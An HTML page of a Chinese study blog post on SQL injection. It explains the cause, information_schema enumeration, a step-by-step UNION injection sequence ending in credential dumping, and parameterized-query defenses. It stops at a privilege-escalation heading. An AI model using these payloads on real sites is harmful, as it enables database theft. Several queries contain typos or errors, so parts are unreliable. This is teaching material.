@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.3.1/css/all.min.css" integrity="sha256-4Lad8m4ZWW1Lgb9+sMVLYEfnIh7BjV1NQMEe79Pviks=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"etreamour.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="本文记录SQL注入基础原理、手工注入思路、简单payload和防御手段。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="欢迎访问我的博客">
+<meta property="og:description" content="本文记录SQL注入基础原理、手工注入思路、简单payload和防御手段。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%871.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%872.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%873.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%874.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%875.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%876.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%877.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%878.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%879.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8710.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8711.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8712.png">
+<meta property="og:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8713.png">
+<meta property="article:published_time" content="2026-10-15T01:21:21.000Z">
+<meta property="article:modified_time" content="2026-10-15T02:25:50.638Z">
+<meta property="article:author" content="Xzt">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%871.png">
+
+
+<link rel="canonical" href="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/","path":"2026/10/15/SQL注入/","title":"SQL注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入 | 欢迎访问我的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-search popup-trigger" aria-label="搜索" role="button">
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">欢迎访问我的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习记录，分享知识</p>
+  </div>
+
+  <div class="site-nav-toggle" aria-label="切换导航栏" role="button">
+      <i class="fa fa-ellipsis fa-fw fa-lg"></i>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-layer-group fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">7</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Xzt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://etreamour.github.io/2026/10/15/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Xzt">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎访问我的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入 | 欢迎访问我的博客">
+      <meta itemprop="description" content="本文记录SQL注入基础原理、手工注入思路、简单payload和防御手段。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-10-15 09:21:21 / 修改时间：10:25:50" itemprop="dateCreated datePublished" datetime="2026-10-15T09:21:21+08:00">2026-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞笔记</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">本文记录SQL注入基础原理、手工注入思路、简单payload和防御手段。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>SQL注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">定义：用户可控的数据被数据库当成了代码语法执行</span><br><span class="line">根本缘由：应用程序用字符串拼接的方式构造SQL，破坏了“语法指令结构”与“用户字面量数据”的边界</span><br><span class="line">最典型登录功能为例（漏洞代码PHP示例）</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%871.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST[‘username’]：从HTTP POST请求提重直接获取前端提交的用户名。攻击者完全可控</span><br><span class="line">POST[‘password’]：密码字符值。攻击者完全可控</span><br><span class="line">SELECT *：选择该行所有列，查出的用户对象将交由后端逻辑做“是否存在记录”的认证判断</span><br><span class="line">FROM users：目标数据表为用户表</span><br><span class="line">WHERE...AND...：逻辑与过滤条件，必须用户名与密码哈希同时对比成功，才会放回行记录</span><br><span class="line">‘username’与’password’：外层的单引号是代码写死的边界。所有的闭合引号攻击，目标就是提前结束整个单引号的界定符号，让后面的内容逃逸出字符串环境</span><br><span class="line"></span><br><span class="line">所有注入漏洞的本质：都是程序试图使用用一种通信信道，即传输控制指令，又传输用户数据，并且编译解码前夕盲目执行字符串的凭借。只要打破了数据与代码隔离，注入就可以实现</span><br><span class="line"></span><br><span class="line">数据库结构层级：</span><br><span class="line">	数据库管理系统（DBMS，如mysql实例）</span><br><span class="line">		数据库（database，如shop_db...）</span><br><span class="line">			数据表（table，如users，ordes...）</span><br><span class="line">				列/字段（colimn，如id，name...）</span><br><span class="line">					行/记录（row，具体存放的一条条业务数据）</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%872.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询数据库版本：SELECT version();</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%873.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前执行用户的权限：SELECT user();</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%874.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前连接数据库的名：SELECT database();</span><br><span class="line">当前连接数据库表的名：SELECT tables();</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%875.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mysql的藏宝图：information_schema元数据库</span><br><span class="line">Mysql5.0及以上版本自带了一个名为information_schema系统字典数据库，就像整个数据库的户籍档案室，记录着当前数据库实例中所有的库，表，列的元数据</span><br><span class="line"></span><br><span class="line">information_schema</span><br><span class="line">schemata  （字段：schema_name）记录了全实例所有的数据库名</span><br><span class="line">tables  （字段：table_schema,table_name）记录每个库下面有哪些表</span><br><span class="line">columns  （字段：table_schema,table_name,column_name）记录下每张表有哪些字段名</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%876.png" class="">
+
+<p>标准的元数据检索查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一步：查询当前机器上所有数据库名字</span><br><span class="line">	SELECT schema_name FROM information_schema.schemate;</span><br><span class="line">第二步：查询当前数据库下包含的所有表名</span><br><span class="line">	SELECT table_schema FROM information_schema.tables WHERE table_schema = database();</span><br><span class="line">第三步：查出特定用户表（user）内部所有列字段名</span><br><span class="line">	SELECT column_name FROM information_schema.columns WHERE table_schema = database() AND table_name = &#x27;users&#x27;;</span><br><span class="line">第四步：从已探明的表和列中，脱出核心账密</span><br><span class="line">	SELECT username,password FROM users;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>单行注释符</th>
+<th>字符串连接函数</th>
+<th>系统元数据字典</th>
+<th>特异性攻击特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MYysql</td>
+<td>– （需有空格）、#</td>
+<td>concat()&#x2F;group_concat()</td>
+<td>information_schema</td>
+<td>支持宽字节注入，默认支持多行注释&#x2F;<em>…</em>&#x2F;</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>–</td>
+<td>‘string</td>
+<td></td>
+<td>string’</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>–</td>
+<td>‘string</td>
+<td></td>
+<td>string’</td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td>–</td>
+<td>string + string</td>
+<td>sysobjects、syscolumns</td>
+<td>默认支持堆叠查询，内置强大且危险的xp_cmdshell拓展存储过程</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>–</td>
+<td>‘string</td>
+<td></td>
+<td>string’</td>
+</tr>
+</tbody></table>
+<p>注入的分类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">数据类型：数字型与字符型</span><br><span class="line">数字型注入：参数在后端直接作为整形或浮点型拼接入SQL，没有单引号和双引号进行语法包裹</span><br><span class="line">	--后端拼接代码示例：$sql=&quot;SELECT * FROM products WHERE id =&quot; .$_GET[&#x27;id&#x27;];</span><br><span class="line">	--攻击者提交：?id=1 AND 1=1</span><br><span class="line">	SELECT * FROM products WHERE id = 1 AND 1=; --页面响应正常</span><br><span class="line">	--攻击者提交：?id=1 AND 1=2</span><br><span class="line">	SELECT * FROM products WHERE id = 1 AND 1=2; --页面不正常或返回无数据</span><br><span class="line"></span><br><span class="line">字符注入：参数在后端被单引号’或双引号”包裹，输入的内容默认处于字符串面量环境</span><br><span class="line">	--后端代码示例：$sql=&quot;SELECT * FROM products WHERE name =&quot; .$_GET[&#x27;name&#x27;]&quot;&quot;&#x27;;</span><br><span class="line">	--攻击者提交：?name=admin&#x27; AND &#x27;1&#x27;=&#x27;1</span><br><span class="line">	SELECT * FROM products WHERE name =&#x27;admin&#x27; AND &#x27;1&#x27;=&#x27;1; --引号闭合，逻辑成立</span><br><span class="line">	--攻击者提交：?name=admin&#x27; AND &#x27;1&#x27;=&#x27;2</span><br><span class="line">	SELECT * FROM products WHERE name =&#x27;admin&#x27; AND &#x27;1&#x27;=&#x27;2; --逻辑为假，判定不同</span><br></pre></td></tr></table></figure>
+
+<p>按回显方式 显示注入与盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">显注：UNION联合查询注入（直接在页面原本的数据区回显）、报错注入（数据被强行夹带在数据库系统报错信息中）</span><br><span class="line">盲注：布尔盲注（仅有真/假，有/无两种页面状态）、时间盲注（页面无任何差异，全凭响应延迟高低判断）、带外通信注入（借助DNS/HTTP请求将数据外发至监听机）</span><br></pre></td></tr></table></figure>
+
+<p>怎么发现注入点，识别注入点必须建立标准测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一阶段：基础字符破坏测试：输入单引号/双引号/反斜杠，观察是否抛出原生数据库语法报错</span><br><span class="line">第二阶段：布尔逻辑差分测试：提交AND 1=1（真）与AND 1=2（假），对比页面返回内容是否出现二元分化</span><br><span class="line">第三阶段：算法运算等价测试：针对数字型接口。提交?id=3-1，观察页面是否渲染出id=2的业务逻辑</span><br><span class="line">第四阶段：时间侧信道延迟：页面无任何回显和逻辑变化死活，提交AND sleep(3)，测算响应耗时是否为3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有回显时：UNION联合查询注入</span><br><span class="line">	适合前提：用户提交的查询结构，能够直接在页面HTML或接口JSON中渲染回显出来。这是所有注入手法带宽最大，拖库效率最高，消耗服务器资源最少的手法</span><br><span class="line">	1.联合查询的关系代数本质与语法约束</span><br><span class="line">		UNION运算符属于关系代数的并集运算。SQL语句标准对参与UNION运算的两个独立SELECT查询提出了两条机器严格编译期要求：</span><br><span class="line">			1.列数必须严格决定相等：第一个SELECT查询了N列，第二个SELECT也必须查询N列，哪怕多一列或少一列，语法分析器会直接抛出编译异常</span><br><span class="line">			2.对应位置的数据类型必须兼容：第一列与第一列的域必须相容</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%877.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2.跨数据库的类型兼容性机制与普适性NULL探针法</span><br><span class="line">	弱类型引擎（Mysql/SQLite）：具有极度宽松的隐式类型转换机制。原查询列即使是DATATIME或INT，UNION对应列硬塞入只付出’admin’，mysql也能自动进行隐式类型识别并渲染</span><br><span class="line">	强类型引擎（Oracle/PostgerSQL）：执行极其严格的静态类型校验</span><br><span class="line">	普适性的NULL占位探针法：在SQL标准规范中，NULL是唯一的多态伪类型，可以在予以上无损的向任何物理数据类型（整形，字符，日期）安全隐式降级</span><br></pre></td></tr></table></figure>
+
+<p>科学探测标准步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--先用NULL占位凑齐列数（假定起那么已经测数3列，Oracle必须补FROM dual）</span><br><span class="line">?id =1&#x27; UNION ALL SELECT NULL,NULL,NULL FROM dual--</span><br><span class="line">--逐列将null替换成字符测试类型，如果页面不报错，说明支持字符回显</span><br><span class="line">?id =1&#x27; UNION ALL SELECT &#x27;a&#x27;,NULL,NULL FROM dual-- --报错说明第一列不是字符型</span><br><span class="line">?id =1&#x27; UNION ALL SELECT NULL,&#x27;a&#x27;,NULL FROM dual-- --成功说明第二列字符串展示</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%878.png" class="">
+
+<p>回显位判定与游标取数模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单行游标限制绝大多数web应用详情页（user.php?uid=10,article.php?id=1），其后端业务代码在设计之初就假定了主键查询指挥返回一条记录</span><br><span class="line">当你传入正常id=1并附加UNION SELECT时，数据库执行合并，返回了包含2行记录的结果集。但由于后端代码只写单词fetch()，php去除第0行后就关闭游标，攻击者挂载在第一行的敏感数据被应用直接无视并丢弃，页面依然只显示正常文章。</span><br><span class="line">-1技巧本质：输入一个业务绝对不存在的id（-1，99999999999999或and1=2），迫使原查询返回空集(0).此时，攻击者的UNION查询函数就自然晋升为整个结果集第0行，被后端fetch()捕获并渲染在屏幕上</span><br></pre></td></tr></table></figure>
+
+<p>UNION经典六步法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">第一步：使用ORDER BY精准探测到原始查询列数</span><br><span class="line">?id=1&#x27; ORDER BY 1-- 正常</span><br><span class="line">?id=1&#x27; ORDER BY 2-- 正常</span><br><span class="line">?id=1&#x27; ORDER BY 3-- 正常</span><br><span class="line">?id=1&#x27; ORDER BY 4-- 异常</span><br><span class="line">结论：查询出列数为3列</span><br><span class="line"></span><br><span class="line">第二步：定位页面有效回显位（-1技巧清场）</span><br><span class="line">?id=-1&#x27; UNION ALL SELECT 1,2,3--</span><br><span class="line">页面原本显示标题和正文的位置出现了数字2和数字3，数字1未出现，确定当前页面的有效回显槽位第二列和第三列</span><br><span class="line"></span><br><span class="line">第三步：提取数据库基础设施指纹</span><br><span class="line">?id=-1&#x27; UNION ALL SELECT 1,version(),user()--</span><br><span class="line">?id=-1&#x27; UNION ALL SELECT 1,database(),3--</span><br></pre></td></tr></table></figure>
+
+<p>查询PostgreSQL:</p>
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%879.png" class="">
+
+<p>查询MSSQL:</p>
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8710.png" class="">
+
+<p>查询Oracle</p>
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8711.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第四步：枚举当前库内所有的数据表</span><br><span class="line">?id=-1&#x27; UNION ALL SELECT 1,group_concat(table_name),3 FROM information_schema.table WHERE table_schema=database()--</span><br><span class="line"></span><br><span class="line">group_concat(table_name):将查询到的数据库表放到一个回显槽位中</span><br><span class="line"></span><br><span class="line">第五步：枚举目标表内的所有列字段</span><br><span class="line">?id=-1&#x27; UNION ALL SELECT 1,group_concat(column_name),3 FROM nformation_schema.columns WHERE table_schema=database() AND table_name=&#x27;user&#x27;--</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; UNION ALL SELECT privilege_type,2,3 FROM information_schema.user_privileges WHERE grantee=concat(&#x27;\&#x27;&#x27;,replace(current_user,&#x27;@&#x27;,&#x27;\&#x27;@\&#x27;&#x27;),&#x27;\&#x27;&#x27;) AND privilege_type=&#x27;FILE&#x27;-- </span><br><span class="line">（?id=-1&#x27; UNION ALL SELECT privilege_type,2,3 -- 原数据中专门存放权限名称的字段，information_schema.user_privileges：指定从系统全局用户权限映射表中检索数据，grantee=被授权人匹配条件：用于硬性过滤权限归属者的子句。因为该表中字段极其严格，固定为&#x27;用户&#x27;@&#x27;主机名&#x27;，必须通过后面的字符串函数进行动态拼接，current_user()：动态获取当前用户：内置函数，我们靶机返回的yxcrm@loaclhost，无法直接与grantee匹配，需要进行格式转换，replace(current_user,&#x27;@&#x27;,&#x27;\&#x27;@\&#x27;&#x27;)：替换插值：将yxcrm@loaclhost中的@替换为\&#x27;@\&#x27;,使其变成yxcrm&#x27;@&#x27;loaclhost，cancat(&#x27;\&#x27;&#x27;,replace(current_user,&#x27;@&#x27;,&#x27;\&#x27;@\&#x27;&#x27;),&#x27;\&#x27;&#x27;)强行包裹单引号：在变形后的字符串首尾在拼接一个单引号，成功拼接出&#x27;yxcrm&#x27;@&#x27;localhost&#x27;，privilege_type=&#x27;FILE&#x27;：指定刷选FILE权限，如果有这个权限返回FILE没有返回空值）</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8712.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第六步：窃取核心数据</span><br><span class="line">?id=-1&#x27; UNION ALL SELECT 1,group_concat(username,0x3a,password),3 FROM user--</span><br><span class="line">0x3a = ：</span><br><span class="line">username,0x3a,password（amdin:123）</span><br></pre></td></tr></table></figure>
+
+<p>参数化查询（预编译）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">预编译：在真正执行数据查询之前，先把带有占位符的SQL语句发送给数据库引擎</span><br><span class="line">	数据库做了什么：</span><br><span class="line">		语法分析解析：确认语法合法性</span><br><span class="line">		编译与生成执行计划：确定用哪个索引，先查那张表，采用什么执行路径</span><br><span class="line">	关键特征：在预编译阶段，SQL的逻辑结构（树状语法树）就已经固定死了。后续任何传入的内容，都绝对不能改变这条SQL的执行逻辑</span><br><span class="line">参数化：在SQL骨架被预编译固定后，应用程序把用户具体输入的内容作为独立的参数值，单独打包传给数据库</span><br><span class="line">	数据库做什么：把传入的参数直接填入预编译好的槽位里，仅作为纯文本/纯数据处理，不再进行语法解析</span><br><span class="line">	关键特征：即使用户在参数里写入OR 1=1 --数据库也只是把它当作一个普通的字符串（就去会找名字为OR 1=1 --），完全丧失了作为指令运行的能力</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8713.png" class="">
+
+<p>提权创建的思路：</p>
